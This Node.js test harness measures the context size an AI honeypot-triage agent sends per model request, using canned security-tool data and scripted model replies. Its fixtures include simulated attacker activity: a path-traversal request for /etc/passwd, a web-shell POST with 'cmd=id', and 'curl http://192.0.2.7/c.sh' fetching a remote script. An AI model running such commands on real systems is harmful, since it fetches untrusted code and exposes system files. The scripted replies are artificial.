// P003-T039 A9：上下文体积测量 harness（自包含，不依赖 /tmp 里的旧脚本）。
//
// 测什么：syslog 主路径（honeypot，triage 模式 + streamContext）**同一条告警**在一次研判里
// 发给模型的所有请求体积。一次请求 = model-client 实际 POST 的 {messages, tools} 的 JSON 长度。
//   - 首轮：第 1 次请求（系统提示词 + 首轮 user：syslog、事件匹配、必查项、Wiki 常驻页、事件详情）
//   - 峰值轮：调查轮（带工具的请求 + 终局轮）里最大的一次
//   - 复核轮：独立质疑者的请求（不带工具）
//   - 全流程：全部请求之和
// 另记「系统段」：每次请求 messages[0] 的长度（系统提示词逐轮重发的字节数，A7 的口径）。
//
// 跑法：
//   node evidence/test/P003-T039/context-size.mjs                 # 量当前树
//   node evidence/test/P003-T039/context-size.mjs --tree=<dir>    # 量指定树（基线/变异树）
//   node evidence/test/P003-T039/context-size.mjs --json          # 只输出 JSON
import { mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';

const here = path.dirname(fileURLToPath(import.meta.url));
export const repoRoot = path.resolve(here, '..', '..', '..');

// ---- 场景数据：一条蜜罐告警，事件带 61 行交互时间线（其中 12 行有 HTTP 请求摘要、6 行有响应长度）----
const payload = {
  event_id: '36870', host_id: '41', host_ip: '10.0.0.5', source_ip: '192.0.2.7',
  target_ip: '10.0.0.5', target_port: '80', user_name: 'root',
  event_create_time: '2026-11-19 08:00:00', rule_name: '蜜罐诱捕-Web 服务',
  process_command_line: '/usr/sbin/nginx -g daemon off;'
};

function httpDigest(index) {
  const line = index % 3 === 0 ? `GET /admin/../../etc/passwd HTTP/1.1\r\nHost: 10.0.0.5\r\n\r\n`
    : index % 3 === 1 ? `POST /shell.php HTTP/1.1\r\nHost: 10.0.0.5\r\nContent-Length: 42\r\n\r\ncmd=id`
      : 'GET / HTTP/1.0\r\n\r\n';
  return Buffer.from(line).toString('base64');
}

function timeline() {
  return Array.from({ length: 61 }, (_, index) => ({
    timestamp: 1793600000 + index,
    src_addr: '192.0.2.7',
    dest_addr: '10.0.0.5:80',
    request_length: index % 2 ? 0 : 20 + (index % 7),
    response_length: index === 46 || index === 47 ? 512 : 0,
    response_digest: index % 5 === 0 ? httpDigest(index) : ''
  }));
}

const honeypotEvent = () => ({
  event_id: 36870, id: 36870, host_id: 41, host_view: { host_id: 41, host_ip: '10.0.0.5',
    host_name: 'web-05', group_name: '生产/对外' },
  source_ip: '192.0.2.7', address: '10.0.0.5:80', level: '高', created_at: 1793600000,
  rule_name: '蜜罐诱捕-Web 服务', timeline: timeline()
});

const processTree = () => Array.from({ length: 10 }, (_, row) => ({ pid: 1000 + row, ppid: 999,
  pname: `p-${row}`, exename: '/usr/bin/x', uname: 'www', uid: 33, euname: 'www', euid: 33,
  cmdline: 'sh -c "curl http://192.0.2.7/c.sh"', start_time: 1793600000 + row }));

const hostEvents = () => ({ total: 30, events: Array.from({ length: 5 }, (_, index) => ({
  id: 100 + index, host_view: { host_id: 41, host_ip: '10.0.0.5', host_name: 'web-05' },
  level: '中', created_at: 1793600000 + index, cmdline: index % 2 ? 'systemctl status nginx' : 'id',
  source_ip: '192.0.2.7', dest: { host_ip: '10.0.0.5', port: 80 },
  process_tree: processTree()
})) });

const commandList = () => ({ total: 24, events: Array.from({ length: 5 }, (_, index) => ({
  id: 200 + index, host_id: 41, host_view: { host_id: 41, host_name: 'web-05' },
  cmdline: index % 2 ? 'cat /etc/passwd' : 'uname -a', uname: 'www', uid: 33, cwd: '/var/www',
  started_at: 1793600000 + index, finished_at: 1793600000 + index + 1, exit_code: 0
})) });

const processList = () => ({ total: 12, result: Array.from({ length: 5 }, (_, index) => ({
  id: 300 + index, host_info: { id: 41, host_ip: '10.0.0.5' }, name: 'nginx', pid: 1200 + index,
  ppid: 1, cmdline: 'nginx: worker process', user: 'www', path: '/usr/sbin/nginx', safety: 'unknown'
})) });

const processDetail = () => ({
  ID: 300, collect_time: 1793600000,
  host_info: { id: 41, host_ip: '10.0.0.5', host_name: 'web-05' },
  process_info: { id: 300, name: 'nginx', pid: 1200, ppid: 1, cmdline: 'nginx: worker process',
    user: 'www', uid: 33, path: '/usr/sbin/nginx', safety: 'unknown', work_dir: '/var/www' },
  file_info: { id: 44, path: '/usr/sbin/nginx', md5: 'f'.repeat(32), sha256: 'a'.repeat(64),
    safety: 'trusted', size: 1234567 }
});

// ---- 工具目录：只放研判主路径会用的那几个（名字与 investigationToolNames 对齐）----
const catalogSchema = (properties, required = []) => ({ type: 'object', properties, required });
const toolCatalog = () => [
  { name: 'get_honeypot_event', inputSchema: catalogSchema({ id: { type: 'number' } }, ['id']) },
  { name: 'list_honeypot_events', inputSchema: catalogSchema({ source_ip: {}, count: {}, offset: {} }) },
  { name: 'list_host_events', inputSchema: catalogSchema({ host_id: {}, types: {}, count: {}, offset: {} }) },
  { name: 'list_host_assets', inputSchema: catalogSchema({ host_ip: {}, count: {} }) },
  { name: 'get_host_info_detail', inputSchema: catalogSchema({ id: { type: 'number' } }, ['id']) },
  { name: 'get_host_business_info', inputSchema: catalogSchema({ host_id: {}, count: {} }) },
  { name: 'list_process_assets', inputSchema: catalogSchema({ filters: {}, count: {}, offset: {} }) },
  { name: 'get_process_asset', inputSchema: catalogSchema({ id: { type: 'number' } }, ['id']) },
  { name: 'list_port_assets', inputSchema: catalogSchema({ filters: {}, count: {} }) },
  { name: 'list_firewall_connection_records', inputSchema: catalogSchema({ filters: {}, count: {} }) },
  { name: 'list_network_audit_events_by_host', inputSchema: catalogSchema({ filters: {}, count: {} }) },
  { name: 'get_internal_ip_define', inputSchema: catalogSchema({}) },
  { name: 'list_full_commands_by_host', inputSchema: catalogSchema({ host_id: {}, count: {}, offset: {} }) },
  { name: 'get_full_command', inputSchema: catalogSchema({ id: { type: 'number' } }, ['id']) }
];

const canned = {
  get_honeypot_event: honeypotEvent,
  list_honeypot_events: () => ({ total: 3, events: [honeypotEvent()] }),
  list_host_events: hostEvents,
  list_host_assets: () => ({ total: 1, events: [{ id: 41, host_ip: '10.0.0.5', host_name: 'web-05',
    group_name: '生产/对外', kernel_version: '5.10.0' }] }),
  get_host_info_detail: () => ({ id: 41, host_ip: '10.0.0.5', host_name: 'web-05', group_name: '生产/对外' }),
  get_host_business_info: () => ({ total: 1, events: [{ host_id: 41, business: '官网', owner: '张三' }] }),
  list_process_assets: processList,
  get_process_asset: processDetail,
  list_port_assets: () => ({ total: 2, result: [{ id: 500, host_info: { id: 41 }, port: 80, cmd: 'nginx' }] }),
  list_firewall_connection_records: () => ({ total: 4, result: [{ id: 600, source_cidr: '192.0.2.7',
    dest_cidr: '10.0.0.5', port: '80~80', process: 'nginx', conn_type: '1' }] }),
  list_network_audit_events_by_host: () => ({ total: 2, events: [{ id: 700, host_view: { host_id: 41 },
    source_ip: '192.0.2.7', dest: { host_ip: '10.0.0.5', port: 80 } }] }),
  get_internal_ip_define: () => ({ net_address: ['10.0.0.0/8', '172.16.0.0/12'] }),
  list_full_commands_by_host: commandList,
  get_full_command: () => ({ id: 200, cmdline: 'cat /etc/passwd', uname: 'www', host_id: 41 })
};

// 固定的模型脚本：与树无关，四批工具轮（8 次取证，正好撞上 8 次上限）→ 终局轮 → 复核轮。
// 这样两次测量走的是同一条轨迹，体积差只来自上下文瘦身本身。
const toolBatches = [
  [{ name: 'list_host_events', arguments: { host_id: 41, count: 20 } },
    { name: 'list_full_commands_by_host', arguments: { host_id: 41, count: 5 } }],
  [{ name: 'list_process_assets', arguments: { filters: { host_id: [41] }, count: 5 } },
    { name: 'list_honeypot_events', arguments: { source_ip: '192.0.2.7', count: 5 } }],
  [{ name: 'list_host_assets', arguments: { host_ip: '10.0.0.5', count: 5 } },
    { name: 'get_process_asset', arguments: { id: 300 } }],
  [{ name: 'list_firewall_connection_records', arguments: { filters: { source_cidr: ['192.0.2.7'] }, count: 5 } },
    { name: 'wiki_page', arguments: { id: 'HP-10' } }]
];

const conclusion = {
  verdict: '存疑', confidence: '低', summary: '蜜罐出现多次 HTTP 探测，未见利用成功的直接证据',
  analysis: '事件详情给出 61 行交互时间线，其中两行有响应长度；未见认证尝试或后续命令。',
  claims: [{ text: '事件来自 192.0.2.7', citations: [{ evidence_id: 'cw:1', pointer: '/source_ip', value: '192.0.2.7' }] }],
  missing_data: ['未取到 Web 访问日志']
};

// 终局轮/复核轮的历史里没有工具消息，user 正文就是一份 JSON：把各键的字数摊开，报告里能说清钱花在哪。
function breakdownOf(content) {
  const text = String(content || '');
  const at = text.indexOf('\n{');
  if (at < 0) return null;
  try {
    const payload = JSON.parse(text.slice(at + 1));
    return Object.fromEntries(Object.entries(payload).map(([key, value]) => [key, JSON.stringify(value ?? null).length]));
  } catch { return null; }
}

function scriptedReply(index, messages, tools) {
  const first = String(messages[0]?.content || '');
  const last = String(messages.at(-1)?.content || '');
  if (first.startsWith('你是独立质疑者')) {
    return { content: JSON.stringify({ assessment: 'supported', concerns: [], missing_evidence: [] }) };
  }
  if (last.startsWith('请根据以下已查询证据')) return { content: JSON.stringify(conclusion) };
  if (!tools.length) {
    return { content: JSON.stringify({ assessment: 'supported', concerns: [], missing_evidence: [] }) };
  }
  const batch = toolBatches[index - 1];
  if (batch) {
    return { tool_calls: batch.map((call, n) => ({ id: `call-${index}-${n}`, type: 'function',
      function: { name: call.name, arguments: JSON.stringify(call.arguments) } })) };
  }
  return { content: JSON.stringify(conclusion) };
}

/**
 * 在指定树里跑一次 syslog 主路径，返回体积指标。
 * @param {string} tree 树根（含 investigation-agent.js 的目录）
 */
export async function measure(tree = repoRoot) {
  const load = name => import(pathToFileURL(path.join(tree, name)));
  const [{ InvestigationAgent }, { AgentToolbox }, wikiModule] = await Promise.all([
    load('investigation-agent.js'), load('agent-tools.js'), load('src/contexts/knowledge/infrastructure/wiki-store.js')]);
  const wiki = new wikiModule.WikiStore(path.join(tree, 'wiki'));
  const knowledgeStore = {
    agentIndex: (...args) => wiki.agentIndex(...args),
    agentContextPages: (...args) => wiki.agentContextPages(...args),
    agentPage: (...args) => wiki.agentPage(...args),
    agentSearch: (...args) => wiki.agentSearch(...args),
    publishedFor: async () => []
  };
  const toolbox = new AgentToolbox({
    listTools: async () => toolCatalog(),
    callTool: async name => {
      const build = canned[name];
      if (!build) throw new Error(`测量场景没有 ${name} 的数据`);
      return build();
    }
  });
  const requests = [];
  const model = { model: 'measure', complete: async (messages, tools) => {
    const index = requests.length + 1;
    requests.push({
      index,
      system: String(messages[0]?.content || '').length,
      bytes: JSON.stringify({ messages, tools }).length,
      toolSchemas: tools.length,
      review: !tools.length && String(messages[0]?.content || '').startsWith('你是独立质疑者'),
      final: !tools.length && String(messages.at(-1)?.content || '').startsWith('请根据以下已查询证据'),
      userBytes: String(messages[1]?.content || '').length,
      breakdown: breakdownOf(messages[1]?.content)
    });
    return scriptedReply(index, messages, tools);
  } };
  const agent = new InvestigationAgent(toolbox, model, undefined, knowledgeStore);
  const streamContext = {
    parsed: { msgid: 'cloudwalker-honeypot', ts: '2026-11-19T08:00:00Z', payload_format: 'keyvalue', payload },
    context: {},
    match: { matched: true, type: 'honeypot', alert_id: 'honeypot:36870', event_id: 36870,
      event: honeypotEvent(), gap_seconds: 12, candidates: 1,
      coverage: { returned: 1, total: 1, exact_event_id: true } },
    caseInfo: { case_dir: await mkdtemp(path.join(tmpdir(), 'hids-measure-case-')), files: ['00-这是什么.md', '03-研判事实.md'] }
  };
  try {
    const result = await agent.run('honeypot:36870', { mode: 'triage', streamContext });
    const investigation = requests.filter(request => !request.review);
    const peak = investigation.reduce((max, request) => (request.bytes > max.bytes ? request : max), investigation[0]);
    return {
      ok: result.verdict.verdict === 'uncertain',
      requests,
      size: {
        first: requests[0].bytes,
        peak: peak.bytes,
        review: (requests.find(request => request.review) || { bytes: 0 }).bytes,
        flow: requests.reduce((sum, request) => sum + request.bytes, 0)
      },
      system: {
        firstRequest: requests[0].system,
        total: requests.reduce((sum, request) => sum + request.system, 0)
      },
      profile: {
        requests: requests.length,
        eventRawBytes: JSON.stringify(honeypotEvent()).length,
        firstUserBytes: requests[0].userBytes
      }
    };
  } finally {
    await rm(streamContext.caseInfo.case_dir, { recursive: true, force: true });
  }
}

const isMain = process.argv[1] && path.resolve(process.argv[1]) === fileURLToPath(import.meta.url);
if (isMain) {
  const treeArg = process.argv.find(argument => argument.startsWith('--tree='));
  const measured = await measure(treeArg ? path.resolve(treeArg.slice(7)) : repoRoot);
  if (!process.argv.includes('--json')) {
    console.log(`# 树：${treeArg ? path.resolve(treeArg.slice(7)) : repoRoot}`);
    console.log(`# 场景：honeypot syslog 主路径，${measured.profile.requests} 次请求，事件原文 ${measured.profile.eventRawBytes} 字`);
    console.log('轮次  bytes  system  tools  user');
    for (const request of measured.requests) {
      console.log(`${String(request.index).padEnd(5)} ${String(request.bytes).padStart(6)} ${String(request.system).padStart(7)} ` +
        `${String(request.toolSchemas).padStart(5)} ${String(request.userBytes).padStart(5)} ${request.review ? '复核' : ''}`);
    }
    console.log(`首轮=${measured.size.first} 峰值轮=${measured.size.peak} 复核轮=${measured.size.review} 全流程=${measured.size.flow}`);
    console.log(`系统段：首轮请求 ${measured.system.firstRequest}，全流程 ${measured.system.total}`);
  }
  console.log(JSON.stringify(measured));
}
